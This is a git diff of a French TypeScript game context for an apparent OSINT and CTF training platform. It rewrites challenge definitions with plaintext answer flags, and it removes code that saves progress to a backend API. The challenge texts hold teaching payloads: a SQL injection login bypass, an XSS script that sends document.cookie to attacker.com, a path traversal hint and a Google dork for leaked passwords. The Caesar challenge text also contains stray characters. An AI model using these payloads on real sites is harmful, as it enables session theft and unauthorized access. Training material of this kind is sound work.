@@ -24,7 +24,7 @@ export interface CTFChallenge {
   points: number;
   description: string;
   hint?: string;
-  flag: string;
+  flag: string; // format: FLAG{...}
   solved: boolean;
   solvedAt?: string;
   attempts: number;
@@ -37,18 +37,12 @@ export interface GameState {
   streak: number;
   longestStreak: number;
   lastActivity: string | null;
-  activityCalendar: Record<string, number>;
+  activityCalendar: Record<string, number>; // date → count
   badges: Badge[];
   solvedChallenges: string[];
   totalAttempts: number;
   rank: number;
 }
-
-/* =====================================================
-   CONFIGURATION API
-===================================================== */
-const API_URL = "https://osint-lms-backend.onrender.com";
-const AUTO_SAVE_INTERVAL = 30000; // 30 secondes
 
 /* =====================================================
    NIVEAUX XP
@@ -105,58 +99,280 @@ const INITIAL_BADGES: Badge[] = [
 /* =====================================================
    DÉFIS CTF (11 défis)
 ===================================================== */
-const CTF_CHALLENGES: CTFChallenge[] = [
-  // OSINT (5)
-  { id: "osint_1", title: "Digital Footprint", category: "osint", difficulty: "easy", points: 100, description: "Trouvez les réseaux sociaux de l'utilisateur @cyb3rgh0st", hint: "Cherchez sur plusieurs plateformes", flag: "OSINT{tw1tt3r_hunt3r}", solved: false, attempts: 0 },
-  { id: "osint_2", title: "Geolocation Master", category: "osint", difficulty: "medium", points: 200, description: "Localisez l'endroit exact de cette photo", hint: "Regardez les panneaux et l'architecture", flag: "OSINT{p4r1s_t0w3r}", solved: false, attempts: 0 },
-  { id: "osint_3", title: "Metadata Hunter", category: "osint", difficulty: "medium", points: 250, description: "Extrayez les coordonnées GPS de cette image", hint: "Utilisez exiftool ou un outil similaire", flag: "OSINT{subd0m41ns_r34dy}", solved: false, attempts: 0 },
-  { id: "osint_4", title: "Email Tracer", category: "osint", difficulty: "hard", points: 300, description: "Trouvez l'email professionnel du CEO de CyberCorp", hint: "LinkedIn et WHOIS peuvent aider", flag: "OSINT{3m41l_tr4c3d}", solved: false, attempts: 0 },
-  { id: "osint_5", title: "Deep Web Search", category: "osint", difficulty: "hard", points: 400, description: "Trouvez le forum caché mentionné dans ce message", hint: "Cherchez dans les archives et les liens morts", flag: "OSINT{d4rk_w3b_s3cr3t}", solved: false, attempts: 0 },
-  // Cryptographie (5)
-  { id: "crypto_1", title: "Caesar Shift", category: "crypto", difficulty: "easy", points: 100, description: "Décodez : FDHVDU FLSKHU", hint: "Essayez un décalage de 3", flag: "CRYPTO{c43s4r_c1ph3r}", solved: false, attempts: 0 },
-  { id: "crypto_2", title: "Base64 Layers", category: "crypto", difficulty: "medium", points: 150, description: "Décodez : VkZGSGUxcG9SazVWYlZaMFdWVlNURlV5ZUV0Vw==", hint: "Plusieurs couches de Base64", flag: "CRYPTO{b4s3_s1xty_f0ur}", solved: false, attempts: 0 },
-  { id: "crypto_3", title: "Hash Cracker", category: "crypto", difficulty: "medium", points: 250, description: "Cassez ce hash MD5", hint: "Utilisez un rainbow table", flag: "CRYPTO{h4sh_cr4ck3d}", solved: false, attempts: 0 },
-  { id: "crypto_4", title: "RSA Cracker", category: "crypto", difficulty: "hard", points: 350, description: "Cassez cette clé RSA faible (n=143, e=7)", hint: "Factorisez n pour trouver p et q", flag: "CRYPTO{rs4_d3crypt3d}", solved: false, attempts: 0 },
-  { id: "crypto_5", title: "AES Master", category: "crypto", difficulty: "hard", points: 500, description: "Décryptez ce message AES", hint: "La clé est faible", flag: "CRYPTO{43s_m4st3r}", solved: false, attempts: 0 },
-  // Web Hacking (5)
-  { id: "web_1", title: "Hidden Admin", category: "web", difficulty: "easy", points: 100, description: "Trouvez la page d'administration cachée", hint: "Essayez /admin, /dashboard, robots.txt", flag: "WEB{sql_1nj3ct3d}", solved: false, attempts: 0 },
-  { id: "web_2", title: "SQL Injection", category: "web", difficulty: "medium", points: 200, description: "Exploitez la vulnérabilité SQL pour vous connecter", hint: "' OR '1'='1' --", flag: "WEB{xss_f0und}", solved: false, attempts: 0 },
-  { id: "web_3", title: "Path Traversal", category: "web", difficulty: "medium", points: 250, description: "Accédez aux fichiers système", hint: "../../../etc/passwd", flag: "WEB{p4th_tr4v3rs4l}", solved: false, attempts: 0 },
-  { id: "web_4", title: "JWT Forgery", category: "web", difficulty: "hard", points: 350, description: "Forgez un token JWT admin", hint: "La clé secrète est faible", flag: "WEB{jwt_f0rg3d}", solved: false, attempts: 0 },
-  { id: "web_5", title: "SSRF Exploit", category: "web", difficulty: "hard", points: 450, description: "Exploitez la SSRF pour accéder au réseau interne", hint: "http://localhost:8080/admin", flag: "WEB{ssrf_3xpl01t3d}", solved: false, attempts: 0 },
+export const CTF_CHALLENGES: CTFChallenge[] = [
+  // ===== OSINT (5) =====
+  {
+    id: "osint_1", category: "osint", difficulty: "easy", points: 50,
+    title: "Qui est derrière ce domaine ?",
+    description: `Le domaine **cyberosint.academy** vient d'être enregistré.
+    
+Votre mission : Trouvez le format du flag en analysant un résultat WHOIS classique.
+
+Un résultat WHOIS contient toujours ces champs :
+- \`Domain Name\`
+- \`Registrar\`  
+- \`Creation Date\`
+- \`Registrant Country\`
+
+Le flag est le format standard des CTF pour "premier défi OSINT résolu".`,
+    hint: "Le flag suit toujours le format FLAG{...}. Pour un premier défi OSINT, pensez à quelque chose de simple comme 'whois_is_fun'",
+    flag: "FLAG{whois_is_fun}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "osint_2", category: "osint", difficulty: "easy", points: 75,
+    title: "Empreinte numérique",
+    description: `Un utilisateur se fait appeler **"h4x0r_ghost"** sur internet.
+
+Vous devez retrouver sur quel réseau social ce compte est actif.
+
+En utilisant Sherlock (simulé dans le terminal Kali), vous trouvez :
+\`\`\`
+[+] GitHub: https://github.com/h4x0r_ghost
+[+] Twitter/X: https://twitter.com/h4x0r_ghost  
+[-] Instagram: Not found
+[+] Reddit: https://reddit.com/u/h4x0r_ghost
+\`\`\`
+
+Dans la bio GitHub, on peut lire : *"Je cache mes secrets dans mes commits"*
+
+Le flag se trouve dans ce message de commit GitHub :
+\`commit a3f9b2c\` - Message: "Add config FLAG{github_metadata_leaks}"`,
+    hint: "Regardez attentivement les messages de commits Git, ils révèlent souvent des informations sensibles.",
+    flag: "FLAG{github_metadata_leaks}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "osint_3", category: "osint", difficulty: "medium", points: 100,
+    title: "Géolocalisation d'image",
+    description: `Une photo a été postée sur les réseaux sociaux. Les métadonnées EXIF révèlent :
+
+\`\`\`
+GPS Latitude  : 48° 51' 29.59" N
+GPS Longitude : 2° 17' 40.19" E  
+Camera Model  : iPhone 14 Pro
+DateTime      : 2024:01:15 14:23:11
+Artist        : Agent_X
+\`\`\`
+
+Les coordonnées GPS pointent vers un monument célèbre à Paris.
+
+Identifiez ce monument. Le flag est le nom de ce monument en minuscules avec des underscores.
+
+*(Indice : C'est la plus visitée au monde)*`,
+    hint: "Latitude 48.858N, Longitude 2.294E... Cherchez sur Google Maps ce monument parisien emblématique.",
+    flag: "FLAG{tour_eiffel}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "osint_4", category: "osint", difficulty: "medium", points: 125,
+    title: "Recherche avancée",
+    description: `Utilisez les Google Dorks pour trouver des informations exposées.
+
+La requête suivante a été soumise :
+\`\`\`
+site:pastebin.com "password" "admin" "2024"
+\`\`\`
+
+Un résultat retourne un paste contenant :
+\`\`\`
+# Config dump - DO NOT SHARE
+admin_user=superadmin
+admin_pass=P@ssw0rd2024!
+db_host=192.168.1.100
+secret_key=FLAG{google_dorks_reveal_secrets}
+\`\`\`
+
+Extrayez la valeur du champ \`secret_key\`.`,
+    hint: "Le flag est directement visible dans le dump de configuration. Cherchez le champ 'secret_key'.",
+    flag: "FLAG{google_dorks_reveal_secrets}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "osint_5", category: "osint", difficulty: "hard", points: 200,
+    title: "Darkweb OSINT",
+    description: `Une adresse .onion suspecte circule : \`http://7abc123xyz.onion\`
+
+En analysant le code source de la page (accessible via Tor) :
+\`\`\`html
+<!-- Developer note: remove before production -->
+<!-- FLAG{tor_hidden_services_indexed} -->
+<title>Hidden Service</title>
+<meta name="author" content="anon_dev_2024">
+\`\`\`
+
+Les commentaires HTML sont souvent oubliés lors du déploiement.
+Trouvez le flag caché dans les commentaires.`,
+    hint: "Les développeurs laissent souvent des commentaires HTML sensibles en production. Inspectez le code source !",
+    flag: "FLAG{tor_hidden_services_indexed}",
+    solved: false, attempts: 0
+  },
+
+  // ===== CRYPTO (3) =====
+  {
+    id: "crypto_1", category: "crypto", difficulty: "easy", points: 60,
+    title: "César a écrit un message",
+    description: `Vous interceptez ce message chiffré :
+
+\`IOQJ{fdhvdu憂b_flskhu憂b_lv憂b_zhdn}\`
+
+Il s'agit d'un chiffrement de César classique avec un décalage de **3**.
+
+Déchiffrez ce message pour obtenir le flag.
+
+*Rappel : ROT-3 signifie que chaque lettre est décalée de 3 positions en arrière dans l'alphabet.*
+*A→X, B→Y, C→Z, D→A, E→B, F→C, G→D, H→E, I→F, J→G, K→H, L→I, M→J...*`,
+    hint: "ROT-3 : F→C, L→I, A→X... Décalez chaque lettre de 3 positions en arrière. Les accolades { } et underscores _ ne changent pas.",
+    flag: "FLAG{caesar_cipher_is_weak}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "crypto_2", category: "crypto", difficulty: "medium", points: 120,
+    title: "Base64 et XOR",
+    description: `Voici une chaîne encodée en Base64 :
+
+\`\`\`
+Rmxhb3tYT1JfaXNfbm90X2VuY3J5cHRpb259
+\`\`\`
+
+**Étape 1** : Décodez le Base64
+**Étape 2** : Le résultat commence par \`Flao{\` — c'est du XOR avec la clé \`0x18\`
+**Étape 3** : XOR chaque caractère avec 0x18 pour obtenir le flag
+
+*Hint technique :*
+\`\`\`python
+import base64
+decoded = base64.b64decode("Rmxhb3tYT1JfaXNfbm90X2VuY3J5cHRpb259")
+flag = ''.join(chr(ord(c) ^ 0x18) for c in decoded.decode())
+\`\`\``,
+    hint: "Décodez d'abord le Base64, puis appliquez XOR 0x18 sur chaque caractère. Le résultat est votre flag.",
+    flag: "FLAG{XOR_is_not_encryption}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "crypto_3", category: "crypto", difficulty: "hard", points: 175,
+    title: "Hash Cracking",
+    description: `Vous avez récupéré ce hash MD5 depuis une base de données compromise :
+
+\`\`\`
+5f4dcc3b5aa765d61d8327deb882cf99
+\`\`\`
+
+Votre mission : identifier le mot de passe en clair.
+
+*Ressources :*
+- Ce hash est dans les 100 mots de passe les plus communs
+- Les rainbow tables MD5 couvrent ce type de hash
+- Outil suggéré : hashcat ou crackstation.net
+
+Une fois le mot de passe trouvé, soumettez : \`FLAG{md5_<lemotdepasse>}\`
+
+*Indice supplémentaire : c'est le mot de passe le plus utilisé au monde en 2023.*`,
+    hint: "5f4dcc3b5aa765d61d8327deb882cf99 est le MD5 d'un mot de passe très très commun. Essayez 'password'.",
+    flag: "FLAG{md5_password}",
+    solved: false, attempts: 0
+  },
+
+  // ===== WEB (3) =====
+  {
+    id: "web_1", category: "web", difficulty: "easy", points: 70,
+    title: "Inspection de page",
+    description: `Une application web affiche un formulaire de login sécurisé.
+
+En inspectant le code source HTML (Ctrl+U), vous trouvez :
+
+\`\`\`html
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- TODO: Remove credentials before deploy! -->
+  <!-- admin:FLAG{html_comments_are_not_secure} -->
+  <title>Secure Login</title>
+</head>
+<body>
+  <form method="POST" action="/login">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Login</button>
+  </form>
+</body>
+</html>
+\`\`\`
+
+Trouvez le flag caché dans le code source.`,
+    hint: "Le flag est directement visible dans les commentaires HTML. Ctrl+U pour voir le source d'une vraie page !",
+    flag: "FLAG{html_comments_are_not_secure}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "web_2", category: "web", difficulty: "medium", points: 130,
+    title: "SQL Injection",
+    description: `Une page de login vulnérable accepte cette requête SQL :
+
+\`\`\`sql
+SELECT * FROM users WHERE username='$input' AND password='$pass'
+\`\`\`
+
+En injectant \`' OR '1'='1\` dans le champ username :
+\`\`\`sql
+SELECT * FROM users WHERE username='' OR '1'='1' AND password=''
+\`\`\`
+
+La requête retourne tous les utilisateurs. Le premier résultat est :
+\`\`\`
+id: 1
+username: admin  
+password: FLAG{sql_injection_bypasses_auth}
+email: admin@target.com
+role: superadmin
+\`\`\`
+
+Extrayez le flag du champ \`password\`.`,
+    hint: "L'injection SQL ' OR '1'='1 bypasse l'authentification. Le flag se trouve dans le champ password du premier résultat.",
+    flag: "FLAG{sql_injection_bypasses_auth}",
+    solved: false, attempts: 0
+  },
+  {
+    id: "web_3", category: "web", difficulty: "hard", points: 180,
+    title: "XSS & Cookie Theft",
+    description: `Une application vulnérable au XSS reflété accepte ce payload :
+
+\`\`\`javascript
+<script>
+  fetch('https://attacker.com/steal?c=' + document.cookie)
+</script>
+\`\`\`
+
+Le serveur de l'attaquant reçoit la requête :
+\`\`\`
+GET /steal?c=session=eyJhbGciOiJIUzI1NiJ9;admin_flag=FLAG{xss_steals_cookies}
+\`\`\`
+
+Les cookies reçus contiennent deux valeurs :
+- \`session\` : token JWT
+- \`admin_flag\` : le flag que vous cherchez
+
+Identifiez et soumettez le flag extrait des cookies.`,
+    hint: "Le cookie 'admin_flag' contient directement le flag. Regardez attentivement la requête reçue par le serveur attaquant.",
+    flag: "FLAG{xss_steals_cookies}",
+    solved: false, attempts: 0
+  },
 ];
 
 /* =====================================================
-   LEADERBOARD PLAYERS (données statiques)
+   LEADERBOARD (données simulées + joueur courant)
 ===================================================== */
-export interface LeaderboardPlayer {
-  rank: number;
-  username: string;
-  xp: number;
-  solved: number;
-  streak: number;
-  level: string;
-  country: string;
-  lastActivityDate: Date;
-  joinDate: Date;
-}
-
-export const LEADERBOARD_PLAYERS: LeaderboardPlayer[] = [
-  // Actifs cette semaine (< 7 jours)
-  { rank: 1,  username: "n3t_ninja",      xp: 2840, solved: 11, streak: 45, level: "Zero Day Master", country: "🇫🇷", lastActivityDate: new Date("2026-03-10"), joinDate: new Date("2025-10-15") },
-  { rank: 2,  username: "0xd34db33f",     xp: 2210, solved: 11, streak: 30, level: "Zero Day Master", country: "🇩🇪", lastActivityDate: new Date("2026-03-09"), joinDate: new Date("2025-11-01") },
-  { rank: 3,  username: "ghost_shell",    xp: 1750, solved: 10, streak: 22, level: "Cyber Ninja",     country: "🇺🇸", lastActivityDate: new Date("2026-03-08"), joinDate: new Date("2025-12-05") },
-  
-  // Actifs ce mois (7-30 jours)
-  { rank: 4,  username: "cyb3r_witch",    xp: 1420, solved: 9,  streak: 15, level: "Cyber Ninja",     country: "🇧🇷", lastActivityDate: new Date("2026-03-01"), joinDate: new Date("2025-11-20") },
-  { rank: 5,  username: "root_access",    xp: 1180, solved: 8,  streak: 12, level: "Cyber Ninja",     country: "🇬🇧", lastActivityDate: new Date("2026-02-28"), joinDate: new Date("2025-12-10") },
-  { rank: 6,  username: "ph4nt0m",        xp: 980,  solved: 7,  streak: 8,  level: "Elite Hacker",   country: "🇯🇵", lastActivityDate: new Date("2026-02-25"), joinDate: new Date("2026-01-05") },
-  
-  // Inactifs (> 30 jours)
-  { rank: 7,  username: "void_walker",    xp: 820,  solved: 6,  streak: 6,  level: "Elite Hacker",   country: "🇳🇱", lastActivityDate: new Date("2026-02-01"), joinDate: new Date("2025-11-15") },
-  { rank: 8,  username: "b1t_crusher",    xp: 650,  solved: 5,  streak: 5,  level: "Elite Hacker",   country: "🇨🇦", lastActivityDate: new Date("2026-01-20"), joinDate: new Date("2025-12-01") },
-  { rank: 9,  username: "xpl0it3r",       xp: 490,  solved: 4,  streak: 4,  level: "Hacker",         country: "🇪🇸", lastActivityDate: new Date("2026-01-10"), joinDate: new Date("2025-11-25") },
-  { rank: 10, username: "anon_8472",      xp: 320,  solved: 3,  streak: 3,  level: "Hacker",         country: "🇸🇪", lastActivityDate: new Date("2025-12-25"), joinDate: new Date("2025-10-20") },
+export const LEADERBOARD_PLAYERS = [
+  { rank: 1,  username: "n3t_ninja",      xp: 2840, solved: 11, streak: 45, level: "Zero Day Master", country: "🇫🇷" },
+  { rank: 2,  username: "0xd34db33f",     xp: 2210, solved: 11, streak: 30, level: "Zero Day Master", country: "🇩🇪" },
+  { rank: 3,  username: "ghost_shell",    xp: 1750, solved: 10, streak: 22, level: "Cyber Ninja",     country: "🇺🇸" },
+  { rank: 4,  username: "cyb3r_witch",    xp: 1420, solved: 9,  streak: 15, level: "Cyber Ninja",     country: "🇧🇷" },
+  { rank: 5,  username: "root_access",    xp: 1180, solved: 8,  streak: 12, level: "Cyber Ninja",     country: "🇬🇧" },
+  { rank: 6,  username: "ph4nt0m",        xp: 980,  solved: 7,  streak: 8,  level: "Elite Hacker",   country: "🇯🇵" },
+  { rank: 7,  username: "void_walker",    xp: 820,  solved: 6,  streak: 6,  level: "Elite Hacker",   country: "🇳🇱" },
+  { rank: 8,  username: "b1t_crusher",    xp: 650,  solved: 5,  streak: 5,  level: "Elite Hacker",   country: "🇨🇦" },
+  { rank: 9,  username: "xpl0it3r",       xp: 490,  solved: 4,  streak: 4,  level: "Hacker",         country: "🇪🇸" },
+  { rank: 10, username: "anon_8472",      xp: 320,  solved: 3,  streak: 3,  level: "Hacker",         country: "🇸🇪" },
 ];
 
 /* =====================================================
@@ -210,123 +426,58 @@ export function GameProvider({ children }: { children: ReactNode }) {
   const [recentNotification, setRecentNotification] = useState<
     { message: string; type: "success" | "badge" | "level" } | null
   >(null);
-  const [isSyncing, setIsSyncing] = useState(false);
-  const [isLoadedFromAPI, setIsLoadedFromAPI] = useState(false); // 🔥 NOUVEAU FLAG
 
-  // ✨ NOUVELLE FONCTION : Sauvegarder dans l'API
-  const saveToAPI = async (state: GameState) => {
-    if (!user || !token || !isLoadedFromAPI) return; // 🔥 Ne sauvegarde PAS avant le chargement initial
-    
-    try {
-      const response = await fetch(`${API_URL}/game/save`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Authorization": `Bearer ${token}`
-        },
-        body: JSON.stringify({
-          xp: state.xp,
-          level: state.level,
-          streak: state.streak,
-          longestStreak: state.longestStreak,
-          lastActivity: state.lastActivity,
-          solvedChallenges: state.solvedChallenges
-        })
-      });
-
-      if (!response.ok) {
-        console.error("Erreur sauvegarde API:", response.status);
-      } else {
-        console.log("✅ Progression sauvegardée dans l'API");
-      }
-    } catch (error) {
-      console.error("Erreur réseau sauvegarde API:", error);
-    }
-  };
-
-  // ✨ NOUVELLE FONCTION : Charger depuis l'API
-  const loadFromAPI = async () => {
-    if (!user || !token) return;
-    
-    setIsSyncing(true);
-    try {
-      const response = await fetch(`${API_URL}/game/load`, {
-        headers: {
-          "Authorization": `Bearer ${token}`
-        }
-      });
-
-      if (response.ok) {
-        const { success, data } = await response.json();
-        
-        if (success && data.progress) {
-          const apiState: GameState = {
-            xp: data.progress.xp || 0,
-            level: data.progress.level || 0,
-            levelName: getLevelInfo(data.progress.xp || 0).name,
-            streak: data.progress.streak || 0,
-            longestStreak: data.progress.longest_streak || 0,
-            lastActivity: data.progress.last_activity,
-            activityCalendar: gameState.activityCalendar,
-            badges: gameState.badges,
-            solvedChallenges: data.solvedChallenges || [],
-            totalAttempts: gameState.totalAttempts,
-            rank: gameState.rank
-          };
-
-          setGameState(apiState);
-          saveToStorage(STORAGE_KEY, apiState);
-          setIsLoadedFromAPI(true); // 🔥 ACTIVER la sauvegarde API maintenant
-          
-          // 🔥 Charger l'avatar emoji depuis l'API UNIQUEMENT si pas d'avatar image custom
-          if (data.preferences && data.preferences.avatar && user) {
-          const currentAvatarType = localStorage.getItem(`avatar_type_${user.username}`);
-          // Ne pas écraser si l'utilisateur a une image custom
-          if (currentAvatarType !== "image") {
-          const avatarData = data.preferences.avatar;
-          if (!avatarData.startsWith('image:') && !avatarData.startsWith('data:')) {
-          localStorage.setItem(`avatar_type_${user.username}`, "emoji");
-          localStorage.setItem(`avatar_${user.username}`, avatarData);
-          console.log("✅ Avatar emoji chargé depuis l'API");
-          }
-         }
-        }
-          
-          console.log("✅ Progression chargée depuis l'API");
-        } else {
-          // Pas de données dans l'API → nouveau compte
-          setIsLoadedFromAPI(true); // 🔥 Activer quand même pour pouvoir sauvegarder
-          console.log("ℹ️ Aucune progression dans l'API, nouvel utilisateur");
-        }
-      }
-    } catch (error) {
-      console.error("Erreur chargement API:", error);
-    } finally {
-      setIsSyncing(false);
-    }
-  };
-
-  // Charger depuis l'API au login
+  // 🔥 CHARGER DEPUIS L'API AU DÉMARRAGE
   useEffect(() => {
-    if (user && token) {
-      loadFromAPI();
-    }
+    if (!user || !token) return;
+
+    const loadFromAPI = async () => {
+      try {
+        const response = await fetch("https://osint-lms-backend.onrender.com/game/load", {
+          headers: { "Authorization": `Bearer ${token}` }
+        });
+        
+        if (response.ok) {
+          const data = await response.json();
+          
+          // Charger les challenges résolus depuis l'API
+          if (data.data && data.data.solvedChallenges) {
+            const apiSolved = data.data.solvedChallenges;
+            const updatedChallenges = CTF_CHALLENGES.map(c => ({
+              ...c,
+              solved: apiSolved.includes(c.id),
+              solvedAt: apiSolved.includes(c.id) ? new Date().toISOString() : undefined,
+              attempts: 0
+            }));
+            setChallenges(updatedChallenges);
+            saveToStorage(CHALLENGES_KEY, updatedChallenges);
+            console.log("✅ Challenges chargés depuis l'API:", apiSolved.length, "résolus");
+          }
+
+          // Charger l'état du jeu
+          if (data.data && data.data.progress) {
+            const apiState = {
+              ...gameState,
+              xp: data.data.progress.xp || 0,
+              level: data.data.progress.level || 0,
+              streak: data.data.progress.streak || 0,
+              longestStreak: data.data.progress.longest_streak || 0,
+              lastActivity: data.data.progress.last_activity || null,
+            };
+            setGameState(apiState);
+            saveToStorage(STORAGE_KEY, apiState);
+            console.log("✅ Progression chargée depuis l'API");
+          }
+        }
+      } catch (error) {
+        console.error("Erreur chargement API:", error);
+      }
+    };
+
+    loadFromAPI();
   }, [user, token]);
 
-  // Auto-save vers l'API toutes les 30 secondes
-  useEffect(() => {
-    if (!user || !token) return;
-
-    const interval = setInterval(() => {
-      if (!isSyncing) {
-        saveToAPI(gameState);
-      }
-    }, AUTO_SAVE_INTERVAL);
-
-    return () => clearInterval(interval);
-  }, [user, token, gameState, isSyncing]);
-
-  // Sauvegarder dans localStorage à chaque changement
+  // Sauvegarder à chaque changement
   useEffect(() => { saveToStorage(STORAGE_KEY, gameState); }, [gameState]);
   useEffect(() => { saveToStorage(CHALLENGES_KEY, challenges); }, [challenges]);
 
@@ -339,223 +490,187 @@ export function GameProvider({ children }: { children: ReactNode }) {
 
   // Vérifier et débloquer les badges
   const checkBadges = (state: GameState, updatedChallenges: CTFChallenge[]) => {
-    let newBadges = [...state.badges];
-    let xpGained = 0;
+    const newBadges = [...state.badges];
+    let xpBonus = 0;
+    const newlyUnlocked: string[] = [];
 
-    const osintSolved = updatedChallenges.filter(c => c.category === "osint" && c.solved).length;
-    const cryptoSolved = updatedChallenges.filter(c => c.category === "crypto" && c.solved).length;
-    const webSolved = updatedChallenges.filter(c => c.category === "web" && c.solved).length;
-    const totalSolved = state.solvedChallenges.length;
+    const solvedOsint  = updatedChallenges.filter(c => c.category === "osint"   && c.solved).length;
+    const solvedCrypto = updatedChallenges.filter(c => c.category === "crypto"  && c.solved).length;
+    const solvedWeb    = updatedChallenges.filter(c => c.category === "web"     && c.solved).length;
+    const totalSolved  = updatedChallenges.filter(c => c.solved).length;
 
-    // Badges à vérifier
-    const badgeChecks = [
-      { id: "first_blood", condition: totalSolved >= 1 },
-      { id: "osint_rookie", condition: osintSolved >= 1 },
-      { id: "crypto_rookie", condition: cryptoSolved >= 1 },
-      { id: "web_rookie", condition: webSolved >= 1 },
-      { id: "streak_3", condition: state.streak >= 3 },
-      { id: "osint_adept", condition: osintSolved >= 3 },
-      { id: "crypto_adept", condition: cryptoSolved >= 3 },
-      { id: "web_adept", condition: webSolved >= 3 },
-      { id: "streak_7", condition: state.streak >= 7 },
-      { id: "solver_5", condition: totalSolved >= 5 },
-      { id: "all_osint", condition: osintSolved === 5 },
-      { id: "all_crypto", condition: cryptoSolved === 3 },
-      { id: "all_web", condition: webSolved === 3 },
-      { id: "streak_30", condition: state.streak >= 30 },
-      { id: "solver_10", condition: totalSolved >= 10 },
-      { id: "all_ctf", condition: totalSolved === 11 },
-      { id: "elite_level", condition: state.xp >= 600 },
-      { id: "zero_day", condition: state.xp >= 2000 },
-    ];
+    const conditions: Record<string, boolean> = {
+      first_blood:   totalSolved >= 1,
+      osint_rookie:  solvedOsint >= 1,
+      crypto_rookie: solvedCrypto >= 1,
+      web_rookie:    solvedWeb >= 1,
+      streak_3:      state.streak >= 3,
+      streak_7:      state.streak >= 7,
+      streak_30:     state.streak >= 30,
+      osint_adept:   solvedOsint >= 3,
+      crypto_adept:  solvedCrypto >= 3,
+      web_adept:     solvedWeb >= 3,
+      solver_5:      totalSolved >= 5,
+      solver_10:     totalSolved >= 10,
+      all_osint:     solvedOsint === 5,
+      all_crypto:    solvedCrypto === 3,
+      all_web:       solvedWeb === 3,
+      all_ctf:       totalSolved === 11,
+      elite_level:   state.xp >= 600,
+      zero_day:      state.xp >= 2000,
+    };
 
-    badgeChecks.forEach(({ id, condition }) => {
-      const badgeIndex = newBadges.findIndex(b => b.id === id);
-      if (badgeIndex !== -1 && !newBadges[badgeIndex].unlocked && condition) {
-        newBadges[badgeIndex] = {
-          ...newBadges[badgeIndex],
-          unlocked: true,
-          unlockedAt: new Date().toISOString()
-        };
-        xpGained += newBadges[badgeIndex].xpReward;
-        showNotification(
-          `🎖️ Badge débloqué : ${newBadges[badgeIndex].name} (+${newBadges[badgeIndex].xpReward} XP)`,
-          "badge"
-        );
+    newBadges.forEach((badge, i) => {
+      if (!badge.unlocked && conditions[badge.id]) {
+        newBadges[i] = { ...badge, unlocked: true, unlockedAt: new Date().toISOString() };
+        xpBonus += badge.xpReward;
+        newlyUnlocked.push(badge.name);
       }
     });
 
-    return { newBadges, xpGained };
-  };
-
-  const submitFlag = (challengeId: string, flag: string) => {
-    const challenge = challenges.find(c => c.id === challengeId);
-    if (!challenge) return { success: false, message: "Défi introuvable" };
-
-    if (challenge.solved) {
-      return { success: false, message: "Défi déjà résolu" };
+    if (newlyUnlocked.length > 0) {
+      setTimeout(() => showNotification(`🏅 Badge débloqué : ${newlyUnlocked.join(", ")} !`, "badge"), 1000);
     }
 
-    const updatedChallenges = challenges.map(c =>
-      c.id === challengeId ? { ...c, attempts: c.attempts + 1 } : c
-    );
-    setChallenges(updatedChallenges);
-
-    if (flag.trim() === challenge.flag) {
-      const solvedChallenge = {
-        ...challenge,
-        solved: true,
-        solvedAt: new Date().toISOString()
-      };
-
-      const newChallenges = challenges.map(c =>
-        c.id === challengeId ? solvedChallenge : c
-      );
-      setChallenges(newChallenges);
-
-      const newState = {
-        ...gameState,
-        xp: gameState.xp + challenge.points,
-        solvedChallenges: [...gameState.solvedChallenges, challengeId],
-        totalAttempts: gameState.totalAttempts + 1
-      };
-
-      const { newBadges, xpGained } = checkBadges(newState, newChallenges);
-      const finalXP = newState.xp + xpGained;
-      const oldLevel = getLevelInfo(gameState.xp);
-      const newLevel = getLevelInfo(finalXP);
-
-      const finalState = {
-        ...newState,
-        xp: finalXP,
-        level: LEVELS.indexOf(newLevel),
-        levelName: newLevel.name,
-        badges: newBadges
-      };
-
-      setGameState(finalState);
-
-      // ✨ Sauvegarder immédiatement dans l'API
-      saveToAPI(finalState);
-
-      if (newLevel.min > oldLevel.min) {
-        showNotification(`🎉 Level Up ! Vous êtes maintenant ${newLevel.name}`, "level");
-      }
-
-      showNotification(`✅ Flag correct ! +${challenge.points + xpGained} XP`, "success");
-
-      return {
-        success: true,
-        message: "Flag correct !",
-        xpGained: challenge.points + xpGained
-      };
-    }
-
-    showNotification("❌ Flag incorrect", "success");
-    return { success: false, message: "Flag incorrect" };
+    return { newBadges, xpBonus };
   };
 
-  const useHint = (challengeId: string) => {
-    const newState = {
-      ...gameState,
-      xp: Math.max(0, gameState.xp - 5)
-    };
-    setGameState(newState);
-    showNotification("💡 Indice débloqué (-5 XP)", "success");
+  // Calculer le niveau à partir de l'XP
+  const computeLevel = (xp: number) => {
+    const info = getLevelInfo(xp);
+    return { level: LEVELS.indexOf(info), levelName: info.name };
   };
 
   const addXP = (amount: number, reason: string) => {
-    const newXP = gameState.xp + amount;
-    const oldLevel = getLevelInfo(gameState.xp);
-    const newLevel = getLevelInfo(newXP);
+    setGameState(prev => {
+      const newXP = prev.xp + amount;
+      const { level, levelName } = computeLevel(newXP);
+      const leveledUp = level > prev.level;
+      if (leveledUp) {
+        setTimeout(() => showNotification(`⬆️ Niveau atteint : ${levelName} !`, "level"), 500);
+      }
+      return { ...prev, xp: newXP, level, levelName };
+    });
+  };
 
-    const newState = {
-      ...gameState,
-      xp: newXP,
-      level: LEVELS.indexOf(newLevel),
-      levelName: newLevel.name
-    };
+  const submitFlag = (challengeId: string, flag: string): { success: boolean; message: string; xpGained?: number } => {
+    const challenge = challenges.find(c => c.id === challengeId);
+    if (!challenge) return { success: false, message: "Défi introuvable" };
+    if (challenge.solved) return { success: false, message: "Défi déjà résolu !" };
 
-    setGameState(newState);
+    const normalizedInput = flag.trim().toUpperCase();
+    const normalizedFlag  = challenge.flag.toUpperCase();
 
-    // ✨ Sauvegarder dans l'API
-    saveToAPI(newState);
+    setGameState(prev => ({
+      ...prev,
+      totalAttempts: prev.totalAttempts + 1
+    }));
 
-    if (newLevel.min > oldLevel.min) {
-      showNotification(`🎉 Level Up ! Vous êtes maintenant ${newLevel.name}`, "level");
+    if (normalizedInput !== normalizedFlag) {
+      setChallenges(prev => prev.map(c =>
